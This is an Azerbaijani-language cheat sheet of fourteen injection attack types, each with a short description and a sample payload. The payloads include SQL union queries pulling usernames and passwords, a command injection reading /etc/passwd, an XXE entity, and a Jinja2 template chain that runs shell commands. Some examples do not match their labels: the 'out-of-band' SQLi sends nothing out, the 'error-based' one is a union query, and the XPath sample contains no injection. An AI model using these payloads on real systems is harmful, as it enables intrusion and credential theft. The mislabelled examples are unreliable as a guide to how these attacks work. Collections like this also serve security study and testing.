# Bütün Injection Tipləri

## 1. SQL Injection (SQLi)
SQL Injection, istifadəçinin daxil etdiyi məlumatın SQL sorğusunda icra olunmasına səbəb olur.

### 1.1. Classic SQL Injection
Düzgün sanitizasiya olunmamış istifadəçi girişi ilə SQL sorğusunun manipulyasiyası.
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1';
```

### 1.2. Blind SQL Injection
Sayt səhv mesajı qaytarmasa da, sorğunun nəticəsindən asılı olaraq fərqli cavablar qaytarır.
- **Boolean-based:**
```sql
' OR 1=1 --
```
- **Time-based:**
```sql
' OR IF(1=1, SLEEP(5), 0) --
```

### 1.3. Error-based SQL Injection
SQL səhvlərindən istifadə edərək məlumat çıxarmaq.
```sql
' UNION SELECT 1, database(), user(); --
```

### 1.4. Union-based SQL Injection
`UNION` ifadəsi vasitəsilə başqa bir sorğu nəticəsini birləşdirmək.
```sql
' UNION SELECT null, username, password FROM users --
```

### 1.5. Out-of-band SQL Injection
Daxili sorğularla məlumatın xarici serverə göndərilməsi.
```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
```

## 2. NoSQL Injection
SQL olmayan verilənlər bazalarında hücum etmək üçün istifadə edilir.
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

## 3. Command Injection
Sistemdə əmrlər icra etməyə imkan verir.
```sh
; cat /etc/passwd
```

## 4. LDAP Injection
LDAP sorğularını manipulyasiya edərək istifadəçi identifikasiyasını keçmək.
```ldap
*)(uid=*))(|(uid=*
```

## 5. XPath Injection
XML verilənlər bazasında axtarış sistemlərini aldadaraq giriş əldə etmək.
```xpath
/users/user[username/text()='admin' and password/text()='1234']
```

## 6. XSS (Cross-Site Scripting)
JavaScript kodunun icra edilməsinə səbəb olur.

### 6.1. Stored XSS
```html
<script>alert('Hacked');</script>
```

### 6.2. Reflected XSS
```html
<input type="text" value="<script>alert('XSS');</script>">
```

### 6.3. DOM-based XSS
```javascript
var evil = document.location.hash.substr(1);
document.write(evil);
```

## 7. HTML Injection
HTML strukturunu manipulyasiya edərək səhifənin tərkibini dəyişmək.
```html
<img src=x onerror=alert('Hacked')>
```

## 8. CRLF Injection
HTTP başlıqlarını dəyişmək üçün istifadə olunur.
```http
GET / HTTP/1.1\r\nSet-Cookie: admin=true
```

## 9. Email Header Injection
E-poçt başlıqlarını manipulyasiya edərək phishing hücumları etmək.
```txt
To: victim@example.com\r\nCC: attacker@example.com
```

## 10. Host Header Injection
Serverin `Host` başlığını dəyişərək zərərli URL-ləri yönləndirmək.
```http
Host: evil.com
```

## 11. XML Injection
XML sənədlərini manipulyasiya edərək məlumat oğurlamaq və ya sistemə müdaxilə etmək.
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

## 12. Template Injection
Şablon mühərriklərini manipulyasiya edərək kod icra etmək.
```jinja2
{{ self.__class__.__mro__[1].__subclasses__()[408]('id', shell=True).communicate() }}
```

## 13. Serialization Injection
Deserialization zamanı icra edilən kodları manipulyasiya etmək.
```php
O:4:"Test":1:{s:4:"data";s:5:"hacked";}
```

## 14. GraphQL Injection
GraphQL API-lərinə hücum edərək həssas məlumatları aşkar etmək.
```graphql
query { __schema { types { name } } }
```

